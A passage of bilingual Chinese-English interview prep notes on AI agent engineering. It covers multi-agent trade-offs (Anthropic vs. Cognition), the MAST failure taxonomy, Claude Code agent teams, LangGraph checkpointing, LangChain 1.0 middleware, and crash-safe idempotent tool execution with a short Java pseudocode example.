> The 90.2% is a relative gain on Anthropic's internal research eval: Opus 4 as the lead with Sonnet 4 sub-agents, compared with a single Opus 4. What's more interesting is why. On BrowseComp they found three factors explained 95% of the variance in performance, and token usage alone explained 80%. So multi-agent mostly works because it lets you spend more tokens productively: each sub-agent has its own context window, explores one direction in parallel, and hands back a compressed result. The cost is real. Agents use about four times the tokens of chat, and their multi-agent system used about fifteen times. And they're explicit that it fits breadth-first research, not tasks that need shared context, and not most coding. So when I read that number, my takeaway isn't "always use multi-agent". It's "it's a way to buy quality with tokens, and you only do it when the task is valuable and genuinely parallel."

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 这个对比公平吗？ | 文章没有报告"给单 agent 同样 token 预算"的对比，所以 90.2% 里有多少来自架构、多少来自多花的 token，文章没有拆开。我会自己做等预算对比。 | "They didn't report a same-token-budget baseline, so I can't separate architecture from spend. I'd run an equal-budget comparison on my own eval before adopting it." |
| 怎么防止派太多子 agent？ | 在 prompt 里写按复杂度分档的规则，同时在代码里写死上限和每个子 agent 的预算。 | "Effort-scaling rules in the prompt, plus hard caps in code on the number of workers and each worker's budget." |

**坑**
- 说成"多 agent 比单 agent 强 90%"而不提评测集是内部的、对比的模型配置是什么。
- 把"80% 方差由 token 用量解释"安到 90.2% 那个内部评测上。这个方差分析是在 BrowseComp 上做的。
- 帖子说"多烧约 15 倍 token"，与一手来源一致，但原文是**相对聊天（chat）**的 15 倍，不是相对单 agent。单 agent 约是聊天的 4 倍，推算多 agent 约为单 agent 的 15 ÷ 4 ≈ 3.75 倍（推算，两个数都是"大约"）。

**来源：** [Anthropic – How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)

---

### Q45 · Cognition 写了《Don't Build Multi-Agents》，和 Anthropic 的多智能体研究系统观点相反，你怎么看？ <a id="q45"></a> [↑ 目录](#toc)

**English question:** Cognition published "Don't Build Multi-Agents," which seems to contradict Anthropic's multi-agent research system. How do you reconcile the two views?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 的"多 agent 取舍"四问；[06 长时运行的多 agent 流水线](06-ai-system-design.md#h21) 讲了跑久了为什么变笨。两篇文章的对照本题新补。

**答案要点**
1. **时间**：Cognition 的文章 2025-06-12 发布（作者 Walden Yan），Anthropic 的文章 2025-06-13 发布，几乎同时。
2. **Cognition 的两条原则**：
   - 原则 1：共享上下文，而且要共享完整的 agent 轨迹（trace：每一步的思考、工具调用和结果），不只是单条消息。
   - 原则 2：每个动作都隐含决策，决策冲突（conflict）就会产出坏结果。
   - 例子：做 Flappy Bird 克隆，拆给两个子 agent，一个做出了马里奥风格的背景，另一个做出了不像原作的鸟，最后汇总的 agent 拼不起来。
3. **Cognition 的推荐**：默认用单线程线性 agent（single-threaded linear agent），上下文连续。任务太长时，加一个专门的模型把历史压缩成关键细节、事件和决策（他们为此微调（fine-tuning）过小模型（small model））。
4. **其实不矛盾，区别在任务类型**：
   - Anthropic 做的是**读多写少的调研**。子 agent 各查一个方向，只交回结论，结论之间不需要风格一致。
   - Cognition 做的是**写代码**。每次编辑都隐含设计决策，并行写的部分会互相冲突。
   - Anthropic 自己也写了：多数编程任务不适合多 agent，需要共享上下文的领域也不适合。
5. **两边的共同点**：都认为上下文工程（context engineering：决定模型每一步看到什么）是核心。Anthropic 的做法是子 agent 隔离（isolation）上下文、主 agent 汇总；Cognition 的做法是保持单线程、压缩历史。
6. **我的判断规则**：子任务能独立并行、输出是信息而不是互相耦合的产物时，用多 agent；输出是需要一致的产物（代码、设计）时，用单 agent，或者让子 agent 只做只读调查、不做写操作（write operation）。

**English answer (speakable, ~45–75 s):**
> I don't think they really contradict each other; they're describing different kinds of work. Cognition's argument is about writing: every action carries implicit decisions, so if two sub-agents build parts of the same artifact without each other's full trace, their decisions conflict. Their Flappy Bird example is exactly that: one agent drew a Mario-style background, the other drew a bird that didn't match. Anthropic's system is about reading: sub-agents research separate directions and hand back findings, and findings don't need to share a style. Anthropic even says most coding tasks are a poor fit. So my rule is: parallel agents for independent, read-heavy exploration where the outputs are information; a single thread, maybe with context compression, when the output is one coherent artifact. And if I do use sub-agents in a coding task, I keep them read-only, investigating and reporting back, and leave the edits to one agent.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 那 Claude Code 的子 agent 符合哪边？ | Cognition 文中描述（2025-06）：Claude Code 的子 agent 不和主 agent 并行写代码，主要回答边界清楚的问题，好处是把调查过程挡在主上下文之外。这正好是"只读子 agent"的做法。 | "As Cognition described it in mid-2025, Claude Code's sub-agents answer well-scoped questions and keep investigation out of the main context rather than writing code in parallel, which is the read-only pattern." |
| 压缩历史的风险？ | 压缩会丢细节，丢掉的可能正是后面要用的约束。所以要把关键决策写到外部状态里，不只依赖摘要。 | "Compression loses detail, sometimes the exact constraint you need later, so I also write key decisions to external state instead of relying only on the summary." |

**坑**
- 只站一边（"多 agent 就是坑"或"多 agent 更强"）。面试官要的是你能说出两边各自成立的条件。
- 把 Cognition 的原则 1 说成"共享消息"。原文强调的是共享**完整轨迹**，单条消息不够。

**来源：** [Cognition – Don't Build Multi-Agents](https://cognition.com/blog/dont-build-multi-agents)、[Anthropic – How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)

---

### Q46 · 多智能体系统失败的常见原因有哪些？MAST 是怎么分类的？ <a id="q46"></a> [↑ 目录](#toc)

**English question:** What are the common reasons multi-agent systems fail? How does the MAST taxonomy categorize them?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 A–E 各模式的风险表](06-ai-system-design.md#h23) 已逐条给出控制手段（重复劳动、踢皮球、写冲突、不收敛）；[06 失控循环](06-ai-system-design.md#h36) 讲步数和预算上限。MAST 分类本题新补。

**答案要点**
1. **论文**：Cemri、Pan、Yang 等人《Why Do Multi-Agent LLM Systems Fail?》，arXiv 2503.13657（2025-03 首版，2025-10 修订到 v3），入选 NeurIPS 2025 Datasets and Benchmarks track。
2. **方法**：先由专家标注（labeling） 150 条轨迹，标注者之间的一致性（agreement） κ = 0.88（Cohen's kappa：衡量两个人标注一致程度的指标，1 表示完全一致）。最终数据集 MAST-Data 有 1,600 多条标注轨迹，覆盖 7 个流行的多 agent 框架。另外做了一个 LLM 评审（LLM-as-a-judge）标注器，用来规模化标注。
3. **MAST：3 大类、14 种失败模式（failure mode）**（括号里是论文给的占比）：
   - **FC1 规范与系统设计问题**（specification / system design issues）：不遵守任务要求（11.8%）、不遵守角色设定（1.5%）、**重复步骤（15.7%）**、丢失对话历史（2.8%）、**不知道何时终止（12.4%）**。
   - **FC2 agent 之间不对齐**（inter-agent misalignment）：对话重置（2.2%）、该澄清时不问（6.8%）、任务跑偏（7.4%）、隐瞒信息（0.85%）、忽略其他 agent 的输入（1.9%）、**推理（reasoning）与行动不一致（13.2%）**。
   - **FC3 任务验证问题**（task verification）：过早终止（6.2%）、没验证或验证不完整（8.2%）、验证错误（9.1%）。
   - 三类合计约 44.2% / 32.4% / 23.5%（推算：把各类子项相加，如 11.8 + 1.5 + 15.7 + 2.8 + 12.4 = 44.2）。
4. **关键结论**：大部分失败不是"模型不够聪明"，而是系统设计问题：角色和终止条件写得不清楚、没有验证环节。论文在 ChatDev 上做干预：改进角色设定 +9.4%，加一个高层任务目标验证步骤 +15.6%（论文里提升最大的干预）。
5. **对应的工程控制**：
   - 终止条件和预算写在代码里，不交给模型判断。
   - 用代码检测重复动作（同工具、同参数连续出现）。
   - 角色和任务用模板写清边界。
   - 交接用结构化摘要（summary）。
   - 加独立的验证者，能用测试验证的就用测试。

**English answer (speakable, ~45–75 s):**
> The best reference is the MAST paper from Berkeley, "Why Do Multi-Agent LLM Systems Fail?". They annotated over 1,600 traces across seven frameworks and grouped failures into three categories with fourteen modes. First, specification and system-design issues, like ignoring the task spec, repeating steps, or not knowing when to stop. That's the biggest bucket, about 44% if you add up its modes. Second, inter-agent misalignment: not asking for clarification, derailing, ignoring another agent's input, or reasoning one thing and doing another. Third, task verification: stopping too early, or verifying badly or not at all. The lesson I take is that most failures are design problems, not model IQ. In their ChatDev case study, just adding a high-level verification step improved success by about 15 points. So in my designs, termination and budgets live in code, roles come from a template with explicit boundaries, handoffs carry a structured summary, and there's an independent verifier, ideally executable tests.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 你怎么在自己系统里用这个分类？ | 把它当失败标签：线上失败轨迹按 14 类打标（先人工，再用校准过的 LLM 评审），按占比决定先修哪类。 | "I use it as a labeling scheme: tag failed traces with the fourteen modes, first by hand and then with a calibrated LLM judge, and fix the biggest buckets first." |
| 单 agent 也会有这些问题吗？ | 会。重复步骤、不知道何时停、验证不足在单 agent 里同样常见；多 agent 额外多了 FC2 这一类。 | "Yes. Repetition, missing termination and weak verification happen with one agent too; multi-agent adds the misalignment category on top." |

**坑**
- 把三大类背成"通信、协调、工具"之类自己编的分类。原文是规范/系统设计、agent 间不对齐、任务验证。
- 第一大类的名字有两种写法：NeurIPS 摘要写 specification issues，arXiv v3 正文写 System Design Issues。说"规范与系统设计问题"最稳。
- 说"MAST 证明多 agent 没用"。论文的结论是收益常常很小，而且失败多来自可修的设计问题。

**来源：** [arXiv 2503.13657 – Why Do Multi-Agent LLM Systems Fail?](https://arxiv.org/abs/2503.13657)、[arXiv HTML v3（失败模式占比与 ChatDev 干预）](https://arxiv.org/html/2503.13657v3)、[NeurIPS 2025 poster 页](https://neurips.cc/virtual/2025/poster/121528)

---

### Q47 · 你的多智能体研究系统线上偶发：三个子 agent 查了几乎一样的内容，最终报告重复，关键方面反而漏掉，token 成本翻倍。你怎么排查和修复？ <a id="q47"></a> [↑ 目录](#toc)

**English question:** In production, your multi-agent research system occasionally has three sub-agents researching nearly the same thing; the final report is repetitive, misses key aspects, and token cost doubles. How do you debug and fix it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 A. 主管-工人](06-ai-system-design.md#h24) 的风险表里有"子任务重叠或漏掉 → 任务模板 + 代码检查范围重复 + 汇总时检查覆盖"；[06 §2.10](06-ai-system-design.md#s2-10) 讲 trace。本题按实战流程展开。

**答案要点**
1. **先止血（mitigation）**：
   - 在代码里压低子 agent 数量上限（比如从 5 降到 3）。
   - 给单个任务设总 token 上限，超了就用已有结果直接汇总。
   - 把触发问题的查询类型临时路由到单 agent 路径。
2. **定位**：
   - 拉出问题样本的完整 trace，看主 agent 生成的子任务清单原文。
   - 对比三个子任务描述之间的相似度，以及子 agent 实际发出的搜索词和访问 URL 的重叠率。
   - 判断问题出在哪一层：①规划（planning）层（清单本身就重复）；②执行层（清单不重复，但子 agent 自己漂移到同一个热门方向）。
3. **常见根因（root cause）**：
   - **任务描述太模糊**。Anthropic 的原文例子：一个子 agent 去查 2021 年汽车芯片危机，另外两个重复查了 2025 年供应链。他们的结论是每个子任务都必须写清目标、输出格式、工具和信息源指引、明确的任务边界。
   - 没有"明确不做什么"的负向边界。
   - 子 agent 之间看不到彼此的进度，都往搜索结果最多的方向走。
   - 汇总阶段没有覆盖检查，所以漏掉的方面没人发现。
4. **修复**：
   - **结构化任务模板**：目标、范围内、范围外、建议信息源、输出 schema、预算。
   - **派发前代码检查**：子任务描述两两做 embedding 相似度（向量相似度），超过阈值（threshold）就让主 agent 重写；同时检查原问题的每个方面都有子任务覆盖。
   - **共享"已访问"注册表**：查询和 URL 去重（deduplication）。命中别人查过的结果时直接复用，不重复抓取。
   - **汇总后覆盖检查**：对照原问题的方面清单，缺了就补派一轮（有轮数上限）。
5. **上线指标**：
   - 子任务间平均相似度、URL 重复率。
   - 每个任务的 token 成本（p50/p95）。
   - LLM 评审打的完整性分（completeness），要先和人工标注校准（calibration）。
   - 每次改动在固定评测集上对比，并做小流量灰度（canary）。

**English answer (speakable, ~45–75 s):**
> First I'd stop the bleeding: lower the worker cap in code, add a per-task token ceiling that forces synthesis with what we have, and route the affected query type to the single-agent path. Then I'd pull traces for the bad runs and look at two layers. Did the lead write overlapping subtasks? Or were the subtasks distinct, but the workers drifted into the same popular sources? I'd measure similarity between subtask descriptions, and overlap in queries and URLs. The usual root cause is vague delegation. Anthropic describes exactly this: one worker researched the 2021 chip crisis while two others duplicated 2025 supply-chain work, and their fix was to give every worker an objective, an output format, guidance on sources, and explicit boundaries. So I'd enforce a task template with in-scope and out-of-scope fields, reject overlapping subtasks before dispatch with an embedding check, add a shared registry of visited URLs, and run a coverage check against the original question before the final report. I'd ship it behind a canary and watch overlap rate, cost per task, and judge-scored completeness.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 为什么不让子 agent 互相通信来避免重复？ | 实时互相通信会增加协调失败和 token；Anthropic 也说 agent 目前不擅长实时协调。用共享注册表（共享状态）比自由聊天可控。 | "Free-form chatter adds coordination failures and tokens; Anthropic notes agents aren't yet good at real-time coordination. A shared registry is more controllable than messaging." |
| 阈值怎么定？ | 用历史 trace 标注"重复/不重复"的子任务对，选误杀率可接受的阈值，之后定期复核。 | "Label historical subtask pairs as duplicate or not, pick a threshold with an acceptable false-reject rate, and revisit it periodically." |

**坑**
- 只调 prompt，不加代码检查。偶发问题靠 prompt 压不住。
- 只修重复，不修遗漏。两者是同一个根因（任务边界不清），覆盖检查必须一起上。
- 修复后不看质量，只看成本下降。子 agent 砍少了，完整性也可能跟着掉。

**来源：** [Anthropic – How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)

---

### Q48 · Claude Code 推出了 agent teams，让多个 Claude 实例分工协作、互相发消息。你怎么看这种做法？ <a id="q48"></a> [↑ 目录](#toc)

**English question:** Claude Code introduced agent teams, where multiple Claude instances split work and message each other directly. What's your view on this approach?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 C. 共享状态](06-ai-system-design.md#h26) 讲单一写入者和合并函数，[06 A. 主管-工人](06-ai-system-design.md#h24) 讲主管模式。agent teams 本身无，本题新补。

**答案要点**
1. **事实**：2026-02-05 随 Claude Opus 4.6 发布，状态是研究预览（research preview）。现在文档仍标为实验功能（experimental），默认关闭，需要设环境变量 `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` 打开。
2. **结构**：
   - 团队负责人（team lead）：主会话（session），负责派任务和汇总。
   - 队友（teammates）：每个都是独立的 Claude Code 实例，有自己的上下文窗口，不继承负责人的对话历史，只拿到启动时的任务说明和项目上下文（CLAUDE.md、MCP、skills）。
   - 共享任务清单（task list）：任务有待办、进行中、完成三种状态，可以声明依赖；认领任务用文件锁（file locking）防止两个队友抢到同一个任务。
   - 邮箱（mailbox）：队友之间按名字直接发消息。
3. **和子 agent 的区别**：子 agent 只把结果交回调用者；队友之间可以直接对话、互相质疑。所以 token 更多，成本随队友数量线性增长。
4. **官方给的适用场景和规则**：
   - 适合：并行调研和代码审查（code review）、各自负责独立模块、用"互相反驳的假设"调试。
   - 不适合：顺序依赖强、要改同一个文件、依赖多的任务。
   - 建议 3–5 个队友，每人负责不同的文件，避免互相覆盖。
   - 可以用 hooks（`TeammateIdle`、`TaskCreated`、`TaskCompleted`，退出码 2 表示拦下）做质量门禁，比如测试没过就不许标完成。
5. **我的看法**：它把 Cognition 担心的"隐含决策冲突"用工程手段压住了：每个文件只有一个负责人；共享任务清单是唯一权威状态；测试和 hooks 当裁判。Anthropic 用 16 个并行 Claude 写 C 编译器的实验（约 2,000 个会话、约 2 万美元、约 10 万行 Rust）也说明，**瓶颈在验证器（verifier）和任务切分**，不在 agent 数量。所有 agent 卡在同一个 Linux 内核 bug 上时，16 个 agent 帮不上忙；后来用 GCC 当参照（oracle：已知正确的对照实现）把问题切开，才能并行修。
6. **结论**：它适合可以切成独立文件或独立假设、并且有可靠测试的任务。没有好的测试和清楚的所有权划分，它只会成倍放大成本和冲突。

**English answer (speakable, ~45–75 s):**
> Agent teams shipped as a research preview with Opus 4.6 in February 2026, and they're still behind an experimental flag. One session is the lead; teammates are separate Claude Code instances with their own context windows. They coordinate through a shared task list with dependencies and file locking for claiming tasks, and they can message each other directly, which is the big difference from sub-agents that only report back. I think it's a sensible design because it answers the classic objection to multi-agent coding, conflicting implicit decisions, with ownership and verification: one owner per file, the task list as the single source of truth, and hooks that block a task from being marked done until checks pass. Anthropic's C-compiler experiment with sixteen parallel Claudes showed the same thing: the hard part was the test harness and splitting the work so agents didn't all hit the same bug. So I'd use teams for parallel review, research, or competing debugging hypotheses, with three to five teammates, and not for tightly coupled edits.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 队友之间的消息安全吗？ | 文档写明：收到的消息会标注来自另一个 Claude 会话，而不是用户；队友不能替用户批准权限，被拒的动作也不能转给别的队友绕过。 | "The docs say an incoming message is marked as coming from another Claude session, not the user; a teammate can't approve permissions on your behalf or relay a denied action to bypass the check." |
| 有什么限制？ | 进程内队友不能随会话恢复；任务状态可能滞后；一个会话只能有一个团队，不能嵌套；负责人固定，不能转让。 | "In-process teammates aren't restored on resume, task status can lag, it's one team per session with no nesting, and the lead is fixed." |

**坑**
- 把 agent teams 说成已经 GA。文档仍标 experimental，默认关闭。
- 说"队友共享负责人的上下文"。它们不继承负责人的对话历史，要在启动说明里写清任务细节。
- 引用 C 编译器实验时说它"全自动、完全替代 GCC"。原文明确说它没有自己的汇编器和链接器，16 位 x86 部分还调用 GCC，生成的代码效率也不如 GCC。

**来源：** [Anthropic – Introducing Claude Opus 4.6](https://www.anthropic.com/news/claude-opus-4-6)、[Claude Code docs – Agent teams](https://code.claude.com/docs/en/agent-teams)、[Anthropic – Building a C compiler with a team of parallel Claudes](https://www.anthropic.com/engineering/building-c-compiler)

## 模块 I：框架与工程化 <a id="mi"></a> [↑ 目录](#toc)

### Q49 · LangGraph 的核心概念有哪些？Agent 为什么需要 checkpoint？ <a id="q49"></a> [↑ 目录](#toc)

**English question:** What are LangGraph's core concepts, and why does an agent need checkpointing?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 LangGraph 核心概念](06-ai-system-design.md#h50) 有完整概念表（State + reducer、Node、Edge、Command、Send、Super-step、Checkpointer + thread、durability、interrupt、time travel、Store、Subgraph、recursion_limit）；[06 白板例子](06-ai-system-design.md#h51) 有 Java 风格的工单（ticket）分诊（triage）图；[06 高频追问](06-ai-system-design.md#h54) 和 [06 雷区](06-ai-system-design.md#h55) 有现成英文回答。本题把它压缩成面试 1 分钟版本。

**答案要点**
1. **LangGraph 是什么**：低层编排运行时（orchestration runtime：真正执行流程、管理状态的那层程序），把 agent 或 workflow 表达成一张有状态（stateful）的图。2025-10 发布 1.0。
2. **五个核心概念**：
   - **State + reducer（状态 + 合并函数）**：带类型的共享状态（shared state）。字段默认后写覆盖先写；并行（parallel）写的字段要声明合并函数，比如列表追加。
   - **Node（节点）**：一个函数，输入状态，返回局部更新。里面可以是代码、LLM 调用或子图。
   - **Edge / conditional edge（边 / 条件边）**：固定转移，或者按一个路由（routing）函数的返回值决定下一步。
   - **`Command` / `Send`**：`Command` 让节点同时更新状态和指定下一步，常用来做 handoff；`Send` 在运行时决定派出几个并行任务（fan-out），用来做主管-工人。
   - **Checkpointer + thread（检查点 + 线程）**：每个超步（super-step：同一步里并行执行的一批节点）结束时把状态存下来，用 `thread_id` 区分不同会话（session）或工单。
3. **为什么要 checkpoint**：
   - **人工介入（human-in-the-loop）**：`interrupt()` 暂停等人审批（approval），可能等几小时，期间进程不需要一直活着；之后用 `Command(resume=...)` 在同一个 thread 上恢复。
   - **容错**：进程崩溃后从最近的检查点继续，不用从头再跑一遍 LLM 和工具。
   - **多轮（multi-turn）记忆（memory）**：同一个 thread 的对话可以接着聊。
   - **调试（time travel）**：回到历史检查点查看状态，或者从那里分叉重跑。
4. **生产选型**：`InMemorySaver` 只能开发用，进程重启就没了；`SqliteSaver` 用于本地；生产用 `PostgresSaver`。还要设检查点的保留策略（retention policy），否则会无限增长。
5. **语义陷阱**：恢复时**整个节点从头重跑**，`interrupt()` 之前的代码会再执行一次。所以节点里的副作用（side effect）要幂等（idempotent：执行多次和执行一次结果相同），或者放到单独的节点里。检查点不提供"恰好一次（exactly-once）"保证。

**English answer (speakable, ~45–75 s):**
> LangGraph models an agent as a stateful graph. The state is a typed object with reducers that say how parallel writes merge. Nodes are functions that return partial updates. Edges, including conditional edges, decide what runs next, and Command and Send let a node route or fan out at runtime, which is how you build handoffs and orchestrator-workers. The piece that matters most in production is the checkpointer: after every super-step the state is saved under a thread ID. That gives you three things. Human-in-the-loop, because interrupt can pause for hours without a live process and resume on the same thread. Fault tolerance, because a crash resumes from the last checkpoint instead of re-running every model and tool call. And debugging, because you can inspect or fork from any past checkpoint. The gotcha is that on resume the interrupted node runs again from the top, so side effects before the interrupt must be idempotent. Checkpointing isn't exactly-once.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| `recursion_limit` 能当预算吗？ | 不能。它只限制超步数量，不管 token、成本和墙钟时间（wall-clock：实际经过的时间）。预算要另外做，比如用调用次数上限中间件，或自己计数。 | "No. It caps super-steps, not tokens, cost or wall-clock time. Budgets need their own limits, like call-limit middleware or counters in state." |
| durability 模式怎么选？ | `exit` 只在结束时存，最快，但崩溃会丢中间进度；`async` 异步存；`sync` 每步同步存，最稳也最慢。长任务用 `sync` 或 `async`。 | "Exit is fastest but loses mid-run progress on a crash; sync is safest; for long runs I'd use sync or async." |

**坑**
- 说"用了 checkpoint 就不会重复调用工具"。正在执行的节点会整体重跑，写工具（write tool）必须带幂等键（idempotency key）。
- 说"interrupt 保证了审批安全"。interrupt 只是编排，真正的授权（authorization）检查要放在写操作（write operation）的服务端（server-side）。
- 说"我在生产用过 LangGraph"（如果没有）。按 06 的口径，讲"我会怎么用它实现"。

**来源：** [LangGraph – Persistence](https://docs.langchain.com/oss/python/langgraph/persistence)、[LangGraph – Interrupts](https://docs.langchain.com/oss/python/langgraph/interrupts)、[LangChain – LangChain and LangGraph 1.0](https://www.langchain.com/blog/langchain-langgraph-1dot0)

---

### Q50 · LangChain 1.0 的 create_agent 和 middleware 机制解决了什么问题？ <a id="q50"></a> [↑ 目录](#toc)

**English question:** What problem do LangChain 1.0's `create_agent` and its middleware mechanism solve?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 版本与产品现状](06-ai-system-design.md#h48) 有 1.x 版本表和 `create_react_agent` 已弃用（deprecated）的事实；[06 两者是什么、什么关系](06-ai-system-design.md#h49) 讲了 `create_agent` 建在 LangGraph 之上，以及内置中间件（middleware）和 §2.7 防护的对应关系。本题补 hook 名称和"它解决什么问题"。

**答案要点**
1. **发布**：LangChain 1.0 和 LangGraph 1.0 的官方博客日期是 2025-10-22。`create_agent` 是 1.0 新的标准 agent 构造函数，底层跑在 LangGraph 上，所以自动继承持久化（persistence）和人工介入能力。
2. **解决的问题**：
   - 旧的 `AgentExecutor` 和 `create_react_agent` 只给一个固定的"模型 ↔ 工具"循环（loop），循环内部很难定制。
   - 生产 agent 恰恰需要在循环内部做上下文工程（context engineering）：压缩（compaction）历史、动态选工具、重试（retry）、换模型、脱敏（redaction）、审批。
   - 以前只能自己重写整个循环。博客原话的意思是：多数 agent 构建器限制太多，不允许在核心循环之外定制。
3. **中间件（middleware）的 hook**：
   - 节点式 hook（node-style），在固定时机按顺序运行，可以返回状态更新：`before_agent`（每次调用开始前一次）、`before_model`（每次模型调用前，可以直接跳到 end）、`after_model`、`after_agent`。
   - 包裹式 hook（wrap-style），包住一次调用，自己决定执行几次：`wrap_model_call`（可以执行 0 次＝短路、1 次＝正常、多次＝重试）、`wrap_tool_call`（拦截或改写工具调用）。
4. **内置中间件**：摘要压缩（summarization）、人工审批（human-in-the-loop）、模型调用次数上限、工具调用次数上限、模型故障切换（model fallback）、PII 检测、用 LLM 预选工具（LLM tool selector）、工具重试（tool retry）。
5. **另一个变化**：消息上的标准内容块（`.content_blocks`），让不同厂商（vendor）返回的推理（reasoning）过程、引用（citation）、工具调用有统一的类型。
6. **本质**：把"标准 tool-calling 循环"做成可插拔的流水线（pipeline）。横切关注点（cross-cutting concerns：每一步都要做的通用逻辑，如重试、日志、限额）写成可复用的中间件，类似 Java 里的 Servlet Filter 或 Spring 拦截器。

**English answer (speakable, ~45–75 s):**
> Before 1.0, LangChain's prebuilt agents gave you a fixed model-and-tools loop, and anything inside the loop, like trimming history, picking tools dynamically, retrying, or pausing for approval, meant rewriting the loop yourself. LangChain 1.0, released in October 2025, makes create_agent the standard constructor. It runs on LangGraph, so persistence and interrupts come for free, and it adds middleware: hooks before and after the agent, before and after each model call, and wrap-style hooks around model calls and tool calls. A wrap hook can short-circuit, call once, or retry. It's the same idea as a servlet filter chain in Java. There are built-ins for summarization, human approval, model and tool call limits, model fallback, PII detection and tool retry. So the problem it solves is customization without forking the loop. The one thing I'd add: middleware runs in-process, so it's not a security boundary. Real authorization still lives in the tool's server.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 中间件执行顺序？ | 按列表顺序注册；before 类按顺序执行，wrap 类像洋葱一样一层套一层。多个中间件改同一件事（比如都改 messages）时要小心顺序。 | "They run in list order; wrap hooks nest like an onion, so ordering matters when two middlewares touch the same messages." |
| 什么时候不用 create_agent？ | 流程是固定 workflow、需要显式的分支和 fan-out 时，直接用 LangGraph 的 StateGraph 写更清楚。 | "When the flow is a fixed workflow with explicit branches and fan-out, I'd write a StateGraph directly." |

**坑**
- 还把 `AgentExecutor` 当推荐写法。它在 `langchain-classic` 里，属于 0.x 旧 API；`create_react_agent` 已标弃用。
- 发布日期：官方博客是 2025-10-22；06 里写的 PyPI 上传日（2025-10-17）和 changelog 日期（2025-10-20）是另外两个时间点。面试说"2025 年 10 月"即可。
- 把人工审批中间件当授权：它底层是 LangGraph interrupt，需要 checkpointer + thread_id 才能工作，而且只是编排。

**来源：** [LangChain blog – LangChain and LangGraph 1.0](https://www.langchain.com/blog/langchain-langgraph-1dot0)、[LangChain docs – Middleware overview](https://docs.langchain.com/oss/python/langchain/middleware/overview)、[LangChain docs – Custom middleware（hook 列表）](https://docs.langchain.com/oss/python/langchain/middleware/custom)、[LangChain v1 release notes](https://docs.langchain.com/oss/python/releases/langchain-v1)

---

### Q51 · 一个要跑 2 小时、调用上百次工具的 Agent 任务，进程中途挂了，怎么保证能恢复、不重复执行副作用？ <a id="q51"></a> [↑ 目录](#toc)

**English question:** An agent task runs for two hours and makes hundreds of tool calls. If the process dies midway, how do you make sure it can resume without re-executing side effects?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 框架、手写循环、还是 Temporal](06-ai-system-design.md#h53) 已对比 LangGraph（按超步存检查点、节点整体重跑）和 Temporal（重放事件历史、已完成的 activity 不再执行）；[06 §2.3 工具设计原则 7](06-ai-system-design.md#s2-3) 讲写工具超时（timeout）等于"结果未知"。本题串成完整方案。

**答案要点**
1. **核心原则：状态外置，执行进程无状态（stateless）**。持久化执行（durable execution：流程状态存进数据库，崩溃后从断点继续）的关键在于，进程里不能有"死了就丢"的东西。
   - Anthropic Managed Agents 的设计是把会话（session）做成一份只追加的事件日志（append-only event log）。harness 本身无状态：崩溃后用 `wake(sessionId)` 起一个新实例，读日志接着跑。
   - OpenAI Agents SDK 用快照和恢复（snapshot / rehydration）：沙箱（sandbox）容器（container）丢了，就在新容器里恢复状态，从最近的检查点继续。
2. **每一步都记录**：每次模型调用和工具调用，先写"意图（intent）"，再写"结果"，存到持久存储里（Postgres 检查点或 Temporal 的事件历史）。恢复时，已经有结果的步骤直接用记录的结果，不重新调用。
3. **副作用要幂等**：
   - 每个写操作在**执行前**生成幂等键（比如 `taskId + stepNo`），先落盘，再调用下游；下游按这个键去重（deduplication）。
   - 恢复时发现"有意图、没结果"的写操作，**先查询目标状态**，确认没执行过再重试，而且复用同一个键。
   - 只读（read-only）工具可以直接重跑，或者用缓存（cache）结果。
4. **选型**：
   - 跨服务、要等外部事件或人工、跑几小时到几天：用 Temporal 这类引擎。Temporal 用事件历史重放 workflow 代码，已完成的 activity 直接返回记录的结果；workflow 代码必须是确定性的（deterministic：同样的输入每次走同样的路径），LLM 调用要放进 activity；activity 本身是至少一次（at-least-once）执行，所以仍要幂等。
   - 只是 agent 内部状态（消息、中断）：用 LangGraph + `PostgresSaver`，durability 设 `sync`。
5. **长任务的附加措施**：
   - 心跳（heartbeat）：长工具调用定期报活，超时就判定失败并重调度。
   - 上下文（context）本身也要能恢复：定期把进度写成摘要（summary）或计划文件（Anthropic 研究系统里主 agent 会把计划存进 memory，因为超过 20 万 token 的上下文会被截断）。
   - 整体预算（token、墙钟时间）也要存进状态，恢复后接着算，不能清零。

```java
// Durable step wrapper (illustrative pseudocode)
ToolResult executeStep(TaskState taskState, ToolCall toolCall)
{
    String idempotencyKey = taskState.getTaskId() + ":" + toolCall.getStepNumber();
    StepRecord stepRecord = stepStore.find(idempotencyKey);
    if (stepRecord != null && stepRecord.hasResult())
    {
        return stepRecord.getResult();              // already done: reuse, never re-run
    }
    if (stepRecord != null && toolCall.isWrite())
    {
        ToolResult existing = toolGateway.lookupByKey(toolCall, idempotencyKey);
        if (existing != null)
        {
            stepStore.saveResult(idempotencyKey, existing);
            return existing;                        // write happened before the crash
        }
    }
    stepStore.saveIntent(idempotencyKey, toolCall); // persist intent before side effect
    ToolResult toolResult = toolGateway.call(toolCall, idempotencyKey);
    stepStore.saveResult(idempotencyKey, toolResult);
    return toolResult;
}
```

**English answer (speakable, ~45–75 s):**
